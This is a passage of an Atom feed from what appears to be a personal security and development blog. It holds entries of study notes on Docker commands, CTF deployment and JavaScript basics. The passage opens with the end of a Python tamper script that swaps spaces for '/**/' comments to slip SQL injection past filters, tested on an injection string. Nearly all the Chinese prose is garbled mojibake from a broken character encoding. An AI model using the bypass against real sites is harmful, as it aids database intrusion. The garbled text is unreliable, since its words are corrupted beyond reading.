class="keyword">not</span> flag:</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retVal += x</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line">print(tamper(<span class="string">"1' my name is pz1o' and 1=1#"</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¡ºä¾¿å¤ä¹ ä¸€ä¸‹pythonï¼Œä¸»è¦æ˜¯æŒæ¡ä¸€ä¸‹pythonçš„ä¸»æµæ¡†æ¶ï¼ˆFlaskå’ŒDjango ï¼‰&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="å¼€å‘" scheme="https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="å¼€å‘" scheme="https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="python" scheme="https://pz1o.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Dockerå­¦ä¹ </title>
    <link href="https://pz1o.top/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/"/>
    <id>https://pz1o.top/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-08-07T01:01:06.000Z</published>
    <updated>2020-11-20T14:18:44.308Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç™½å«–çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸èƒ½æµªè´¹äº†ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹docker,åªè®°å½•ä¸€ä¸‹é‡è¦çš„ã€‚</p><p>bç«™å­¦ä¹ èµ„æº<a href="https://www.bilibili.com/video/BV1og4y1q7M4?" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1og4y1q7M4?</a></p><h1 id="DockeråŸºç¡€"><a href="#DockeråŸºç¡€" class="headerlink" title="DockeråŸºç¡€"></a>DockeråŸºç¡€</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812213743035.png" alt="image-20200812213743035"></p><p>é•œåƒï¼ˆ Image ï¼‰ ï¼šDocker é•œåƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æ„å»ºä¹‹åä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚ </p><p>å®¹å™¨ï¼ˆ Container ï¼‰ ï¼šé•œåƒï¼ˆ Image ï¼‰å’Œå®¹å™¨ï¼ˆ Container ï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ ç±» å’Œå®ä¾‹ ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚</p><p>ä»“åº“ï¼ˆ Repository ï¼‰ï¼šä¸€ä¸ª <strong>Docker Registry</strong> ä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆ Repository ï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆ Tag ï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//1.å¸è½½æ—§ç‰ˆæœ¬</span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                   docker-client \</span><br><span class="line">                   docker-client-latest \</span><br><span class="line">                   docker-common \</span><br><span class="line">                   docker-latest \</span><br><span class="line">                   docker-latest-logrotate \</span><br><span class="line">                   docker-logrotate \</span><br><span class="line">                   docker-engine</span><br><span class="line"></span><br><span class="line">//2.éœ€è¦å®‰è£…å®‰è£…åŒ…</span><br><span class="line">yum install -y yum-utils</span><br><span class="line">//3.è®¾ç½®é•œåƒä»“åº“</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">//4.æ›´æ–°yum</span><br><span class="line">yum makecache fast</span><br><span class="line">//5.å®‰è£…docker</span><br><span class="line">yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line">ä¸€ç›´y</span><br><span class="line">//6.å¯åŠ¨docker</span><br><span class="line">systemctl start docker</span><br><span class="line">//7.æµ‹è¯•docker</span><br><span class="line">docker version </span><br><span class="line">docker run hello-world</span><br><span class="line">//8.dockeré•œåƒ</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812224856499.png" alt="image-20200812224856499"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å¸è½½docker</span><br><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line">rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker docker é»˜è®¤å·¥ä½œè·¯å¾„</span><br></pre></td></tr></table></figure><p><strong>runçš„æµç¨‹</strong></p><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813152655350.png" alt="image-20200813152655350"></p><h2 id="Dockerä¸vm"><a href="#Dockerä¸vm" class="headerlink" title="Dockerä¸vm"></a>Dockerä¸vm</h2><p>ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ã€‚<strong>å®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚</strong>å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚</p><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153605377.png" alt="image-20200813153605377"></p><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153615560.png" alt="image-20200813153615560"></p><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker version  &#x2F;&#x2F;ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">docker info  &#x2F;&#x2F;ç³»ç»Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£ï¼š<a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p><p><strong>é•œåƒå‘½ä»¤</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker images -a  //åˆ—å‡ºæ‰€æœ‰é•œåƒ</span><br><span class="line">dokcer images -q  //åªæ˜¾ç¤ºid</span><br><span class="line"><span class="meta">[root@/]#</span><span class="bash"> docker images</span></span><br><span class="line">REPOSITORY(é•œåƒçš„ä»“åº“æº)          TAG(æ ‡ç­¾)                 IMAGE ID(é•œåƒçš„id)            CREATED(åˆ›å»ºæ—¶é—´)             SIZE(å¤§å°)</span><br><span class="line">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class="line"></span><br><span class="line">docker search  mysql  //æœç´¢é•œåƒ</span><br><span class="line">dokcer pull mysql[:tag]  //ä¸‹è½½é•œåƒ</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br><span class="line">docker rmi -f id  //åˆ é™¤é•œåƒ</span><br><span class="line">docker rmi -f $(docker images -aq)  //åˆ é™¤å…¨éƒ¨é•œåƒ</span><br></pre></td></tr></table></figure><p><strong>å®¹å™¨å‘½ä»¤</strong></p><p>==æœ‰é•œåƒæ‰å¯ä»¥åˆ›å»ºå®¹å™¨ï¼Œå…ˆå®‰è£…ä¸€ä¸ªcentos==</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br><span class="line">docker run [å‚æ•°] image  //æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨</span><br><span class="line">--name="name1"  //å®¹å™¨åå­—</span><br><span class="line">-d  //åå°è¿è¡Œ</span><br><span class="line">-P  //éšæœºæŠŠå®¹å™¨çš„ç«¯å£æ˜ å°„åˆ°ä¸€ä¸ªä¸»æœºæœªä½¿ç”¨çš„é«˜ç«¯å£</span><br><span class="line">-i  //ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œå¸¸ä¸-tè¿ç”¨</span><br><span class="line">-t  //ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œå¸¸ä¸-iè¿ç”¨</span><br><span class="line">-it  //äº¤äº’æ–¹å¼è¿è¡Œ</span><br><span class="line">-p ipï¼šä¸»æœºç«¯å£ï¼šå®¹å™¨ç«¯å£  //æŒ‡å®šå®¹å™¨ç«¯å£</span><br><span class="line"></span><br><span class="line">docker ps //æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker ps -a  //å†å²è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker rm å®¹å™¨id  //åˆ é™¤å®¹å™¨</span><br><span class="line">docker rm -f $(docker ps -aq)  //åˆ é™¤æ‰€æœ‰å®¹å™¨</span><br><span class="line">docker start å®¹å™¨id  //å¯åŠ¨å®¹å™¨</span><br><span class="line">docker restart å®¹å™¨id  //é‡å¯å®¹å™¨</span><br><span class="line">docker stop å®¹å™¨id  //åœæ­¢å®¹å™¨</span><br><span class="line">docker kill å®¹å™¨id  //æ€æ­»å®¹å™¨</span><br><span class="line"></span><br><span class="line">//è¿›å…¥å®¹å™¨</span><br><span class="line">docker run -it centos /bin/bash</span><br><span class="line">//é€€å‡ºå®¹å™¨</span><br><span class="line">exit  åœæ­¢é€€å‡º</span><br><span class="line">ctrl+p+q  ä¸åœæ­¢é€€å‡º</span><br></pre></td></tr></table></figure><h2 id="ä»githubå¤ç°CTF"><a href="#ä»githubå¤ç°CTF" class="headerlink" title="ä»githubå¤ç°CTF"></a>ä»githubå¤ç°CTF</h2><p>é¦–å…ˆä»githubä¸Šcloneä¸‹æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone xxx</span><br></pre></td></tr></table></figure><p>è‹¥æœ‰docker.ymlç›´æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">docker ps #æŸ¥çœ‹ç«¯å£å·</span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰dockerfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¿›å…¥dockerfileç›®å½•</span><br><span class="line">è®¾ç½®æƒé™</span><br><span class="line">docker build -t &#39;è‡ªå®šä¹‰é•œåƒåç§°&#39; .(æœ€åæœ‰ä¸€ä¸ªç‚¹)</span><br><span class="line">docker run --name&#x3D;&#39;è‡ªå®šä¹‰å®¹å™¨åç§°&#39; -i -d -P é•œåƒåç§° &#x2F;run.sh</span><br><span class="line">docker ps &#x2F;&#x2F;æŸ¥çœ‹ç«¯å£å·</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç«¯å£å·</p><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151417590.png" alt="image-20201006151417590"></p><p>éƒ¨ç½²å®Œæˆ</p><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151456458.png" alt="image-20201006151456458"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ç™½å«–çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸èƒ½æµªè´¹äº†ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹docker,åªè®°å½•ä¸€ä¸‹é‡è¦çš„ã€‚&lt;/p&gt;
&lt;p&gt;bç«™å­¦ä¹ èµ„æº&lt;a</summary>
      
    
    
    
    <category term="Docker" scheme="https://pz1o.top/categories/Docker/"/>
    
    
    <category term="Docker" scheme="https://pz1o.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Javascriptå­¦ä¹ </title>
    <link href="https://pz1o.top/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/"/>
    <id>https://pz1o.top/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-07-09T08:36:24.000Z</published>
    <updated>2020-11-20T14:19:03.701Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>å‚è€ƒå»–é›ªå³°æ•™ç¨‹<a href="https://www.liaoxuefeng.com/wiki/1022910821149312" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1022910821149312</a></p><h1 id="å…¥é—¨javascript"><a href="#å…¥é—¨javascript" class="headerlink" title="å…¥é—¨javascript"></a>å…¥é—¨javascript</h1><h2 id="å¼•å…¥javascript"><a href="#å¼•å…¥javascript" class="headerlink" title="å¼•å…¥javascript"></a>å¼•å…¥javascript</h2><p><strong>å†…éƒ¨æ ‡ç­¾</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">/...</span><br><span class="line">..</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¤–éƒ¨å¼•å…¥</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./.."</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å˜é‡</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// æ¡ä»¶æ§åˆ¶</span></span><br><span class="line"><span class="keyword">if</span>()&#123;</span><br><span class="line">..</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">..</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(num)</span></span><br></pre></td></tr></table></figure><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p><strong>å˜é‡</strong></p><p>å˜é‡åæ˜¯å¤§å°å†™è‹±æ–‡ã€æ•°å­—ã€<code>$</code>å’Œ<code>_</code>çš„ç»„åˆï¼Œä¸”ä¸èƒ½ç”¨æ•°å­—å¼€å¤´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $<span class="number">1</span> = <span class="string">"a"</span>;</span><br></pre></td></tr></table></figure><p><strong>æ•°å­—</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span> <span class="comment">//æ•´æ•°</span></span><br><span class="line"><span class="number">123.1</span> <span class="comment">//æµ®ç‚¹æ•°</span></span><br><span class="line"><span class="number">1.1e1</span> <span class="comment">//ç§‘å­¦è®¡æ•°æ³•</span></span><br><span class="line"><span class="literal">NaN</span>  <span class="comment">//not a number</span></span><br><span class="line"><span class="string">'abc'</span> <span class="comment">//å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="literal">true</span> <span class="comment">//å¸ƒå°”å€¼</span></span><br></pre></td></tr></table></figure><p><strong>æ¯”è¾ƒè¿ç®—ç¬¦</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">=</span><br><span class="line">== ç­‰äºï¼ˆç±»å‹ä¸ä¸€æ ·ï¼Œå€¼ä¸€æ ·ï¼‰</span><br><span class="line">===  ç»å¯¹ç­‰äºï¼ˆç±»å‹ä¸€æ ·ï¼Œå€¼ä¸€æ ·ï¼‰</span><br></pre></td></tr></table></figure><ol><li>NaN===NaNæ˜¯falseï¼Œå®ƒä¸ä»»ä½•å€¼éƒ½ä¸ç›¸ç­‰ï¼ŒåŒ…æ‹¬è‡ªå·±ã€‚</li><li>isNaNï¼ˆNaNï¼‰ä¼šè¿”å›trueã€‚</li></ol><p><strong>æ•°ç»„</strong></p><blockquote><p>ä¸­æ‹¬å·</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"hello"</span>]</span><br></pre></td></tr></table></figure><p><strong>å¯¹è±¡</strong></p><blockquote><p>å¤§æ‹¬å·,æ¯ä¸ªå±æ€§ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¸éœ€è¦</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">name: <span class="string">"111"</span>,</span><br><span class="line">age: <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person.name</span><br><span class="line">&gt;<span class="number">111</span></span><br><span class="line">person.age</span><br><span class="line">&gt;<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="strictæ¨¡å¼"><a href="#strictæ¨¡å¼" class="headerlink" title="strictæ¨¡å¼"></a><strong>strictæ¨¡å¼</strong></h3><p>åœ¨åŒä¸€ä¸ªé¡µé¢çš„ä¸åŒçš„JavaScriptæ–‡ä»¶ä¸­ï¼Œå¦‚æœéƒ½ä¸ç”¨<code>var</code>ç”³æ˜ï¼Œæ°å¥½éƒ½ä½¿ç”¨äº†å˜é‡<code>i</code>ï¼Œå°†é€ æˆå˜é‡<code>i</code>äº’ç›¸å½±å“ï¼Œäº§ç”Ÿéš¾ä»¥è°ƒè¯•çš„é”™è¯¯ç»“æœã€‚</p><p>ä½¿ç”¨<code>var</code>ç”³æ˜çš„å˜é‡åˆ™ä¸æ˜¯å…¨å±€å˜é‡ï¼Œå®ƒçš„èŒƒå›´è¢«é™åˆ¶åœ¨è¯¥å˜é‡è¢«ç”³æ˜çš„å‡½æ•°ä½“å†…ï¼ˆå‡½æ•°çš„æ¦‚å¿µå°†ç¨åè®²è§£ï¼‰ï¼ŒåŒåå˜é‡åœ¨ä¸åŒçš„å‡½æ•°ä½“å†…äº’ä¸å†²çªã€‚</p><p>ä¸ºäº†ä¿®è¡¥JavaScriptè¿™ä¸€ä¸¥é‡è®¾è®¡ç¼ºé™·ï¼ŒECMAåœ¨åç»­è§„èŒƒä¸­æ¨å‡ºäº†strictæ¨¡å¼ï¼Œåœ¨strictæ¨¡å¼ä¸‹è¿è¡Œçš„JavaScriptä»£ç ï¼Œå¼ºåˆ¶é€šè¿‡<code>var</code>ç”³æ˜å˜é‡ï¼Œæœªä½¿ç”¨<code>var</code>ç”³æ˜å˜é‡å°±ä½¿ç”¨çš„ï¼Œå°†å¯¼è‡´è¿è¡Œé”™è¯¯ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line">abc = <span class="string">""</span>hello world<span class="string">";</span></span><br><span class="line"><span class="string">//ä½¿ç”¨strictæ¨¡å¼ä¸Šé¢ä»£ç ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="string">var abc = "</span>hello world<span class="string">";</span></span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è½¬ä¹‰å­—ç¬¦</span></span><br><span class="line">\n</span><br><span class="line">\t</span><br><span class="line"><span class="string">'\x41'</span>; <span class="comment">// å®Œå…¨ç­‰åŒäº 'A'</span></span><br><span class="line"><span class="string">'\u4e2d\u6587'</span>; <span class="comment">// å®Œå…¨ç­‰åŒäº 'ä¸­æ–‡'</span></span><br></pre></td></tr></table></figure><h3 id="å¤šè¡Œå­—ç¬¦ä¸²"><a href="#å¤šè¡Œå­—ç¬¦ä¸²" class="headerlink" title="å¤šè¡Œå­—ç¬¦ä¸²"></a><strong>å¤šè¡Œå­—ç¬¦ä¸²</strong></h3><p>ç”±äºå¤šè¡Œå­—ç¬¦ä¸²ç”¨<code>\n</code>å†™èµ·æ¥æ¯”è¾ƒè´¹äº‹ï¼Œæ‰€ä»¥æœ€æ–°çš„ES6æ ‡å‡†æ–°å¢äº†ä¸€ç§å¤šè¡Œå­—ç¬¦ä¸²çš„è¡¨ç¤ºæ–¹æ³•ï¼Œç”¨åå¼•å· ``è¡¨ç¤º</p><h3 id="æ¨¡æ¿å­—ç¬¦ä¸²"><a href="#æ¨¡æ¿å­—ç¬¦ä¸²" class="headerlink" title="æ¨¡æ¿å­—ç¬¦ä¸²"></a><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong></h3><p>è¦æŠŠå¤šä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥,å¯ä»¥ç”¨<code>+</code>ä¹Ÿå¯ä»¥ç”¨<code>`${..}</code>è¡¨ç¤º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//+å·</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"xiao"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">123</span>+name);</span><br><span class="line"><span class="comment">//$&#123;&#125;</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"xiao"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`123<span class="subst">$&#123;name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p><strong>æ“ä½œå­—ç¬¦ä¸²</strong></p><blockquote><p>å­—ç¬¦ä¸²æ˜¯ä¸å¯æ”¹å˜çš„ï¼Œæ— è®ºä¹‹åèµ‹å€¼ï¼Œéƒ½ä¸ä¼šæ”¹å˜ã€‚</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(s.length); <span class="comment">//é•¿åº¦</span></span><br><span class="line"><span class="built_in">console</span>.log(s[<span class="number">0</span>]); <span class="comment">//è¾“å‡º</span></span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>JavaScriptçš„<code>Array</code>å¯ä»¥åŒ…å«ä»»æ„æ•°æ®ç±»å‹ï¼Œå¹¶é€šè¿‡ç´¢å¼•æ¥è®¿é—®æ¯ä¸ªå…ƒç´ ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.length;</span><br><span class="line">arr.length = <span class="number">6</span>; <span class="comment">//å¯ä»¥é€šè¿‡ç»™lengthèµ‹å€¼ï¼Œæ”¹å˜æ•°ç»„çš„å¤§å°</span></span><br></pre></td></tr></table></figure><h2 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h2><p>JavaScriptçš„å¯¹è±¡æ˜¯ä¸€ç§æ— åºçš„é›†åˆæ•°æ®ç±»å‹ï¼Œå®ƒç”±è‹¥å¹²é”®å€¼å¯¹ç»„æˆã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 